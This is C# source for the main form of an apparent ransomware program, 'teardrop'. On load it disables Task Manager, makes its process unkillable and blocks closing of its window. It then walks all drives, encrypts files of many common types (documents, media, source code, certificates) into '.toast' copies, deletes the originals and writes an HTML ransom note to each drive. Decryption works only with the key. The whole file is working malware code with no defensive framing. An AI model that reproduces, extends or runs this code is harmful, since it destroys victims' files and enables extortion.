namespace teardrop
{
    public partial class FrmMain : Form
    {
        private string _generatedKey = string.Empty;
        private const string _defaultExtension = ".toast";
        private const string _defaultMessage = "<h1>Title:</h1><p>Message</p>";

        private readonly IProgress<string> _notification;
        private readonly CancellationTokenSource _cancellationTokenSource;

        private enum CypherMode
        {
            Encode,
            Decode
        }

        private readonly string[] skipPaths = new[]
        {
            "WinSxS", "Windows",  "System32", "Program Files",
            "Program Files (x86)", "System Volume Information"
        };

        private readonly string[] allowedExtensions = new[]
        {
            ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav",
            ".pdf", ".raw", ".bat", ".json", ".doc", ".txt",
            ".png", ".cs", ".c", ".java", ".h", ".rar", ".zip",
            ".7zip", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
            ".pptx", ".odt", ".csv", ".sql", ".mdb", ".sln",
            ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
            ".xhtml", ".odt", ".ods", ".wma", ".wav", ".mpa",
            ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz",
            ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico",
            ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb",
            "java", ".cpp", ".cert", ".pem"
        };

        public FrmMain()
        {
            InitializeComponent();
            _notification = new Progress<string>(WriteLine);
            _cancellationTokenSource = new CancellationTokenSource();
        }

        private void Setup()
        {
            GenerateKey();
            GenerateRandomApplicationName();
            ProcessManager.ProcessUnkillable();
            MachineManager.DisableTaskManager();
        }

        private void GenerateKey()
        {
            _generatedKey = CryptoManager.GetRandomString(64);
        }

        private void GenerateRandomApplicationName()
        {
            Text = CryptoManager.GetRandomString(50);
        }

        public void WriteLine(string text)
        {
            txtBox.Text += $"[{DateTime.Now:yyyyy/MM/dd HH:mm:ss}] {text}{Environment.NewLine}";
        }

        private async Task ChangeAllFilesAsync(string rootPath, CypherMode mode, IProgress<string> notification, CancellationToken cancellationToken)
        {
            try
            {
                if ((File.GetAttributes(rootPath) & FileAttributes.ReparsePoint) is not FileAttributes.ReparsePoint)
                {
                    string newFilePath = string.Empty;
                    string defaultKey = _generatedKey;

                    foreach (string directory in GetValidDirectories(rootPath))
                    {
                        foreach (string filePath in Directory.GetFiles(Path.GetFullPath(directory)))
                        {
                            string extension = Path.GetExtension(filePath);

                            switch (mode)
                            {
                                case CypherMode.Encode:
                                    if (!IsValidExtension(extension)) break;

                                    newFilePath = FileManager.AddExtension(filePath, _defaultExtension);

                                    await CryptoManager.EncodeFileAsync(filePath, newFilePath, defaultKey, cancellationToken);

                                    notification.Report($@"Encrypted {filePath}");

                                    RemoveFile(filePath);
                                    break;

                                case CypherMode.Decode:
                                    if (!FileManager.HasExtension(filePath, _defaultExtension)) break;

                                    newFilePath = FileManager.RemoveExtension(filePath, _defaultExtension);

                                    await CryptoManager.DecodeFileAsync(filePath, newFilePath, defaultKey, _cancellationTokenSource.Token);

                                    notification.Report($"Decrypted {filePath}");

                                    RemoveFile(filePath);
                                    break;

                                default: throw new NotSupportedException();
                            }
                        }

                        await ChangeAllFilesAsync(directory, mode, notification, cancellationToken);
                    }
                }
            }
            catch (Exception ex)
            {
                notification.Report(ex.Message);
            }
        }

        private bool IsValidExtension(string extension)
        {
            return allowedExtensions.Contains(extension.ToLower());
        }

        private IEnumerable<string> GetValidDirectories(string path)
        {
            return Directory.GetDirectories(path).Where(directory => !skipPaths.Contains(directory));
        }

        private void RemoveFile(string filePath)
        {
            try
            {
                File.Delete(filePath);
            }
            catch (Exception ex)
            {
                WriteLine($"Cant delete file {ex.Message}");
            }
        }

        private async Task ManageDrivesAsync(CypherMode mode, IProgress<string> notification, CancellationToken cancellationToken)
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                await ChangeDriveAsync(drive, mode, notification, cancellationToken);
            }
        }

        private async Task ChangeDriveAsync(DriveInfo drive, CypherMode mode, IProgress<string> notification, CancellationToken cancellationToken)
        {
            notification.Report($@"Found drive {drive.Name}");

            try
            {
                if (!drive.IsReady) throw new AccessViolationException("Drive is not ready.");

                await ChangeAllFilesAsync(drive.Name, mode, notification, cancellationToken);

                FileManager.WriteHtmlFile(drive.Name, _defaultMessage);

            }
            catch (Exception ex)
            {
                notification.Report($@"Found drive {drive.Name}, but it's not ready. adicional info: {ex.Message}");
            }
        }

        private async void FrmMain_Load(object sender, EventArgs e)
        {
            Setup();
            //await ChangeAllFilesAsync("C:/testDir", CypherMode.Encode, notification, _cancellationTokenSource.Token);
            //await ChangeAllFilesAsync("C:/testDir", CypherMode.Decode, notification, _cancellationTokenSource.Token);

            await ManageDrivesAsync(CypherMode.Encode, _notification, _cancellationTokenSource.Token);
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private async void BtnDecode_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtKey.Text.Trim())) return;

            _generatedKey = txtKey.Text;

            await ManageDrivesAsync(CypherMode.Decode, _notification, _cancellationTokenSource.Token);
        }
    }
}